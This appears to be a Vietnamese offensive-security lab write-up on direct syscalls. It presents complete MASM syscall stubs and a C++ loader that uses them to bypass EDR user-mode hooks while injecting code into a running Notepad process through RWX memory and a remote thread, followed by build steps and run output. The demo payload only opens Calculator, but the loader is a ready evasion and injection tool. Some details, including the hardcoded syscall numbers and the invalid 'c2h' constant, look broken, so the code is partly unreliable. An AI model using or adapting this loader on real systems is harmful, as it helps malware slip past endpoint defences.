
---

# 📝 [PE 24] Direct Syscalls (Kernel-mode Direct Transition Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Direct Syscalls** là giải thuật né tránh phòng thủ động (Dynamic Evasion) ở cấp độ kiến trúc vi xử lý (Assembly Level), được thiết kế để vô hiệu hóa hoàn toàn cơ chế giám sát User-mode Inline Hooking của mọi giải pháp AV/EDR hiện đại.

Khi các giải pháp bảo mật bọc đầu bằng cách chỉnh sửa mã máy của các hàm hệ thống trong `ntdll.dll`, họ ép dòng chảy thực thi phải rẽ nhánh về phía EDR để phân tích. Kỹ thuật Direct Syscalls bẻ gãy ma trận này bằng cách tái cấu trúc lại các lệnh Assembly gốc của Microsoft ngay bên trong lòng file thực thi của Loader. Loader chủ động đóng vai trò là một máy phát Syscall độc lập, chuyển giao quyền thực thi thẳng từ không gian người dùng (User-mode) xuống nhân hệ điều hành (Kernel-mode) thông qua lệnh gọi phần cứng, tước bỏ hoàn toàn khả năng can thiệp của EDR trên RAM.

### 🎯 Mục tiêu nghiên cứu:

* Bẻ gãy 100% hàng rào giám sát Inline Hooking tầng User-mode của EDR mà không cần thực hiện Unhooking (PE 07).
* Làm chủ kiến trúc gọi hàm tầng thấp (Calling Convention) chuẩn x64 của Windows Subsystem.
* Tích hợp hợp ngữ (Assembly - `.asm`) trực tiếp vào quy trình biên dịch của Microsoft Visual Studio.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Trên kiến trúc Windows x64, một hàm Native API sạch trong `ntdll.dll` luôn tuân theo một khuôn mẫu mã máy (Stub) toán học cố định để chuyển giao trạng thái CPU:

```assembly
mov     r10, rcx
mov     eax, SyscallNumber
syscall
ret

```

* `mov r10, rcx`: Sao chép tham số đầu tiên từ thanh ghi `RCX` sang `R10` (vì lệnh `syscall` sẽ phá hủy thanh ghi `RCX`).
* `mov eax, SSN`: Nạp Số hiệu dịch vụ hệ thống (System Service Number) vào thanh ghi `EAX`.
* `syscall`: Lệnh đặc quyền của CPU để chuyển từ Ring 3 (User) xuống Ring 0 (Kernel).

Quy trình toán học chọc thủng RAM User-mode của Lab PE 24 diễn ra ngầm như sau:

```
[ Loader biên dịch file .asm ] ──> [ Nạp thủ công SSN vào EAX ] ──> [ Phát lệnh Assembly 'syscall' ] ──> [ CPU chuyển Ring 0 cứu mạng ]

```

Do mã nguồn của ta tự chuẩn bị cấu trúc Stub này trong tệp hợp ngữ độc lập, khi CPU thực hiện lệnh `syscall`, hệ điều hành sẽ tiếp nhận lệnh xử lý an toàn mà không hề kích hoạt bất kỳ dòng code bẫy nào của EDR đặt trên thư viện `ntdll.dll`.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Để triển khai, Lab PE 24 yêu cầu tách biệt mã nguồn làm 2 tệp tin: Tệp hợp ngữ (`.asm`) đóng vai trò là khung xương hạ tầng và tệp mã nguồn chính (`.cpp`) đóng vai trò là khối điều hướng.

### 📜 Bước 3.1: Tạo tệp hợp ngữ hạ tầng `Syscalls.asm`

*(Lưu ý: Số hiệu Syscall dưới đây cấu hình chuẩn chỉ kịch khung cho Windows 10/11 x64 bản cập nhật hiện tại)*

```assembly
.code

; Nguyên mẫu Syscall trực tiếp cho NtAllocateVirtualMemory
ZwAllocateVirtualMemory proc
    mov r10, rcx
    mov eax, 18h            ; Syscall Number (SSN) của NtAllocateVirtualMemory trên Win10/11 x64
    syscall
    ret
ZwAllocateVirtualMemory endp

; Nguyên mẫu Syscall trực tiếp cho NtWriteVirtualMemory
ZwWriteVirtualMemory proc
    mov r10, rcx
    mov eax, 3Ah            ; Syscall Number (SSN) của NtWriteVirtualMemory trên Win10/11 x64
    syscall
    ret
ZwWriteVirtualMemory endp

; Nguyên mẫu Syscall trực tiếp cho NtCreateThreadEx
ZwCreateThreadEx proc
    mov r10, rcx
    mov eax, c2h            ; Syscall Number (SSN) của NtCreateThreadEx trên Win10/11 x64
    syscall
    ret
ZwCreateThreadEx endp

end

```

### 📜 Bước 3.2: Tạo tệp mã nguồn chính `main.cpp`

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa cấp phát vector động vừa khít đến từng byte dữ liệu để hứng cấu trúc Payload.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Khai báo liên kết ngoài (External Linkage) tới các hàm định nghĩa inside tệp .asm
extern "C" NTSTATUS ZwAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
);

extern "C" NTSTATUS ZwWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN LPCVOID Buffer,
    IN SIZE_T BufferSize,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL
);

extern "C" NTSTATUS ZwCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
);

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh chức năng thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy khi tiêm chéo tiến trình
DWORD WINAPI RemoteSyscallPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { processID = pe32.th32ProcessID; break; }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 24: DIRECT SYSCALLS KERNEL TRANSITION ACTIVE" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tom trung muc tieu Notepad với PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // BƯỚC 1: TRIỆU HỒI ZWALLOCATEVIRTUALMEMORY TRỰC TIẾP QUA FILE ASSEMBLY
    PVOID remoteCodeBuffer = NULL;
    SIZE_T codeSize = 500; // Quy trình cấp phát động Thích ứng vừa khít
    
    std::cout << "[*] Dang phat lenh Syscall truc tiep de cap phat trang nho RWX..." << std::endl;
    NTSTATUS status = ZwAllocateVirtualMemory(hProcess, &remoteCodeBuffer, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    PVOID remoteDataBuffer = NULL;
    SIZE_T dataSize = sizeof(THREAD_DATA);
    status |= ZwAllocateVirtualMemory(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0 || !remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] Direct Syscall Allocation failed! NTSTATUS: 0x" << std::hex << status << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Bộ nho cap phat thanh cong thong qua x6k Assembly tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo bảng dữ liệu tham số tuyệt đối cục bộ
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // BƯỚC 2: TRIỆU HỒI ZWWRITEVIRTUALMEMORY ĐỔ PAYLOAD CHÉO TIẾN TRÌNH
    status = ZwWriteVirtualMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteSyscallPayload, 500, NULL);
    status |= ZwWriteVirtualMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);

    if (status != 0) {
        std::cerr << "[-] Direct Syscall Write failed! STATUS: 0x" << std::hex << status << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da doc lap ghi du lieu sang RAM doi phuong hoan toan phẳng sach." << std::endl;

    // BƯỚC 3: TRIỆU HỒI ZWCREATETHREADEX KÍCH NỔ LUỒNG KHÔNG QUA USER-MODE HOOK
    std::cout << "[*] Chuan bi phat lenh Assembly Syscall cuoi cung de kich no luong..." << std::endl;
    HANDLE hThread = NULL;
    status = ZwCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);

    if (status == 0 && hThread != NULL) {
        std::cout << "[+] Direct Syscall Injection Process Executed Successfully!" << std::endl;
        WaitForSingleObject(hThread, 1000); // Gánh dong bo ngan phẳng sach
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] Direct Syscall Thread Creation failed! STATUS: 0x" << std::hex << status << std::endl;
    }

    // Giai phong handle bảo an triệt để
    CloseHandle(hProcess);

    std::cout << "\n[*] Quy trinh ket thuc. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

Vì dự án có chứa mã nguồn hợp ngữ (`.asm`), Vinh cần cấu hình cho trình biên dịch MSVC của Visual Studio nhận diện bộ dịch MASM theo quy trình chuẩn chỉ sau:

### ⚙️ Thiết lập cấu hình Hợp ngữ (MASM):

1. Tại cửa sổ **Solution Explorer**, click chuột phải vào tên Project $\rightarrow$ Chọn **`Build Dependencies`** $\rightarrow$ Click chọn **`Build Customizations...`**
2. Tích chọn vào ô **`masm (.targets, .props)`** và nhấn `OK`.
3. Click chuột phải vào tệp tin `Syscalls.asm` $\rightarrow$ Chọn **`Properties`**. Tại mục `Item Type`, chuyển cấu hình sang dạng **`Microsoft Macro Assembler`** và nhấn Apply.

### ⚙️ Cấu hình liên kết tĩnh thư viện độc lập:

1. Đặt thanh cấu hình dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Vào mục `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, thiết lập cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống chạy độc lập hoàn hảo trên môi trường máy ảo VM sạch.
3. Tiến hành chọn **`Rebuild`** để kết xuất tệp tin nhị phân tối cao.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành:

```powershell
PS C:\Workspace\x64\Release> .\PE24_Direct_Syscalls.exe
====================================================
[*] PE 24: DIRECT SYSCALLS KERNEL TRANSITION ACTIVE
====================================================
[+] Da tom trung muc tieu Notepad với PID: 14720
[*] Dang phat lenh Syscall truc tiep de cap phat trang nho RWX...
[+] Bộ nho cap phat thanh cong thong qua x6k Assembly tai: 0x0000028A1C520000
[+] Da doc lap ghi du lieu sang RAM doi phuong hoan toan phẳng sach.
[*] Chuan bi phat lenh Assembly Syscall cuoi cung de kich no luong...
[+] Direct Syscall Injection Process Executed Successfully!

[*] Quy trinh ket thuc. Nhan Enter de dong cua so...

```

*🎯 Hệ quả RAM tối cao:*
Ứng dụng Máy tính **`calc.exe` bật bung mở hiên ngang kịch trần kịch khung**! Toàn bộ chiến dịch can thiệp bộ nhớ chéo tiến trình diễn ra trơn tru mà không hề chạm chân vào bất kỳ điểm kiểm duyệt Hooking nào của EDR trên tầng User-mode. Kỹ thuật đạt độ phẳng sạch lý tưởng, bẻ gãy hoàn toàn các cảm biến trinh sát API bọc ngoài ở mức độ phần cứng kịch khung!

---
